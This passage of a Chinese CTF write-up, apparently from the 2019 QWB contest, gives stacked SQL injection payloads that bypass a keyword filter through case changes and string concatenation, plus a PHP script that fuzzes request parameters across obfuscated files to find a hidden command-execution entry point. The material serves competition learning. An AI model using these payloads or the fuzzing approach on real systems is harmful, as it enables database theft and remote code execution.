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" alt="upload"></p> <h2 id="随便注"><a href="#随便注" class="header-anchor">#</a> 随便注</h2> <p>非常直接的 sql 注入，发现过滤了<code>select|update|delete|drop|insert|where|.</code>，尝试报错注入<code>1' and extractvalue(1,concat(0x7e,(database()),0x7e))+--+</code>可以输出一些信息，但是由于过滤的<code>select</code>都很难利用。</p> <p>后来队友发现可以使用堆叠注入，而且<code>set</code>和<code>prepare</code>似乎被过滤，使堆叠注入的方向明确了起来。<code>strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)</code>，由于使用的是大小写敏感的 strstr，便可用大小写轻松绕过。最后的攻击流程是</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment">#查询表名</span>
<span class="token punctuation">;</span><span class="token keyword">sEt</span> <span class="token variable">@sql</span> <span class="token operator">=</span> concat<span class="token punctuation">(</span><span class="token string">'S'</span><span class="token punctuation">,</span><span class="token string">'ELECT table_schema, table_name FROM information_schema'</span><span class="token punctuation">,</span><span class="token number">0x2e</span><span class="token punctuation">,</span><span class="token string">'tables wh'</span><span class="token punctuation">,</span><span class="token string">'ere table_schema = supersqli'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">Prepare</span> stmt <span class="token keyword">from</span> <span class="token variable">@sql</span><span class="token punctuation">;</span><span class="token keyword">execute</span> stmt<span class="token punctuation">;</span><span class="token comment">--</span>
<span class="token comment">#查询列名</span>
<span class="token punctuation">;</span><span class="token keyword">sEt</span> <span class="token variable">@sql</span> <span class="token operator">=</span> concat<span class="token punctuation">(</span><span class="token string">'S'</span><span class="token punctuation">,</span><span class="token string">'ELECT table_name, column_name FROM information_schema'</span><span class="token punctuation">,</span><span class="token number">0x2e</span><span class="token punctuation">,</span><span class="token string">'columns wh'</span><span class="token punctuation">,</span><span class="token string">'ere table_name = 1919810931114514'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">Prepare</span> stmt <span class="token keyword">from</span> <span class="token variable">@sql</span><span class="token punctuation">;</span><span class="token keyword">execute</span> stmt<span class="token punctuation">;</span><span class="token comment">--</span>
<span class="token comment">#打出flag</span>
<span class="token punctuation">;</span><span class="token keyword">sEt</span> <span class="token variable">@sql</span> <span class="token operator">=</span> concat<span class="token punctuation">(</span><span class="token string">'S'</span><span class="token punctuation">,</span><span class="token string">'ELECT flag,2 from `1919810931114514`'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">Prepare</span> stmt <span class="token keyword">from</span> <span class="token variable">@sql</span><span class="token punctuation">;</span><span class="token keyword">execute</span> stmt<span class="token punctuation">;</span><span class="token comment">--</span>
<span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p><img src="/assets/img/2019-qwb-2.b0ce7ec5.png" alt="sqli"></p> <h2 id="高明的黑客-writeup"><a href="#高明的黑客-writeup" class="header-anchor">#</a> 高明的黑客 Writeup</h2> <p>第一步先打开链接，发现一条文字，提示 <code>www.tar.gz</code> 文件是源码。于是从 <code>www.tar.gz</code> 下载好了源代码，打开一看，是近千个被混淆了的 php 文件。</p> <p>首先从文件里发现，每个文件有许多 <code>$_GET.$_POST</code> 参数，还有很多 <code>system(),exec(),eval()</code> 等危险的函数。但是随便打开一个发现，这些函数里面的 参数不是在前面被置空了就是前面有些条件 <code>if(&quot;a&quot; == &quot;b&quot;)</code> 永远是 false 而无法执行。这时就需要动用脚本的力量了。由于文件太多，我们需要找到一个没有这些问题的隐藏的危险函数从而拿到 shell，所以就是脚本时间。因为有所有源码，所以跑脚本使用了本地的 web 服务器和 php。</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">function</span> <span class="token function-definition function">matchPattern</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$context</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">&quot;&quot;</span> <span class="token operator">&amp;&amp;</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$context</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'*'</span> <span class="token operator">==</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token string double-quoted-string">&quot;&quot;</span> <span class="token operator">!=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token string double-quoted-string">&quot;&quot;</span> <span class="token operator">==</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$context</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$context</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token function">matchPattern</span><span class="token punctuation">(</span><span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$context</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">&quot;*&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token function">matchPattern</span><span class="token punctuation">(</span><span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$context</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">matchPattern</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$context</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;/path/to/local/webserver/&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$dirs</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$cnt</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$dirs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$dirs</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$dirs</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=&gt;</span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token operator">==</span> <span class="token string double-quoted-string">&quot;.DS_Store&quot;</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token operator">.</span> <span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;[&quot;</span> <span class="token operator">.</span> <span class="token function">microtime</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;] Processing &quot;</span> <span class="token operator">.</span> <span class="token variable">$v</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>
    <span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;\n&quot;</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$post_arr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$get_arr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$line</span> <span class="token keyword">as</span> <span class="token variable">$linek</span> <span class="token operator">=&gt;</span> <span class="token variable">$linev</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$linev</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$linev</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">matchPattern</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'*$_GET[*\'*\'*]*'</span><span class="token punctuation">,</span> <span class="token variable">$linev</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">matchPattern</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'*$_POST[*\'*\'*]*'</span><span class="token punctuation">,</span> <span class="token variable">$linev</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">//if(matchPattern('if*(*==*)', trim($line[$linek - 1]))) continue;</span>
            <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$linev</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'$_'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$word</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$linev</span><span class="token punctuation">,</span> <span class="token variable">$start</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token function">mb_strrpos</span><span class="token punctuation">(</span><span class="token variable">$linev</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;]&quot;</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token variable">$start</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$word</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'$_POST'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span> <span class="token operator">?</span> <span class="token string double-quoted-string">&quot;post&quot;</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">&quot;get&quot;</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$word</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\\\''</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$word</span><span class="token punctuation">,</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$word</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'[\\\''</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$word</span><span class="token punctuation">,</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$word</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'[\''</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;[&quot;</span><span class="token operator">.</span><span class="token function">round</span><span class="token punctuation">(</span><span class="token function">microtime</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;] &quot;</span><span class="token operator">.</span><span class="token function">strtoupper</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;\t&quot;</span> <span class="token operator">.</span> <span class="token function">str_pad</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token constant">STR_PAD_RIGHT</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;\t=&gt;\t&quot;</span> <span class="token operator">.</span> <span class="token variable">$v</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>
            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'echo &quot;windowslinuxmac&quot;;'</span><span class="token punctuation">;</span>
            <span class="token variable">$cnt</span><span class="token operator">++</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$method</span> <span class="token operator">==</span> <span class="token string double-quoted-string">&quot;post&quot;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$post_arr</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token variable">$get_arr</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$func</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;=&quot;</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$http</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;http&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token string single-quoted-string">'method'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'header'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'Content-Type: application/x-www-form-urlencoded; charset=utf-8'</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'content'</span> <span class="token operator">=&gt;</span> <span class="token function">http_build_query</span><span class="token punctuation">(</span><span class="token variable">$post_arr</span><span class="token punctuation">)</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token comment">//var_dump($http[&quot;http&quot;]);</span>
    <span class="token variable">$context</span> <span class="token operator">=</span> <span class="token function">stream_context_create</span><span class="token punctuation">(</span><span class="token variable">$http</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;http://localhost/web2/&quot;</span> <span class="token operator">.</span> <span class="token variable">$v</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;?&quot;</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;&amp;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$get_arr</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$context</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//echo $result.PHP_EOL;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;请求失败！\n&quot;</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;windowslinuxmac&quot;</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;Found!!!\n&quot;</span><span class="token punctuation">;</span>
            <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;[cnt] &quot;</span> <span class="token operator">.</span> <span class="token variable">$cnt</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br></div></div><p>大致思路就是：遍历每个文件，然后通过字符串截取函数截取出来每个文件里面的所有 <code>$_GET,$_POST</code> 等可以控制输入的参数。然后再将自己的标志字符串输出，并请求每个文件。如果有返回说明 shell 注入成功。</p> <p>等待了大概几分钟，突然找到了一个文件 <code>xk0SzyKwfzw.php</code> 可以注入，于是又写了脚本单独对这个文件进行注入，以便确定是在文件哪里的注入。</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">function</span> <span class="token function-definition function">matchPattern</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$context</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">&quot;&quot;</span> <span class="token operator">&amp;&amp;</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$context</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'*'</span> <span class="token operator">==</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token string double-quoted-string">&quot;&quot;</span> <span class="token operator">!=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token string double-quoted-string">&quot;&quot;</span> <span class="token operator">==</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$context</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$context</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token function">matchPattern</span><span class="token punctuation">(</span><span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$context</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">&quot;*&quot;</span><span class="token punctuation">)</span>
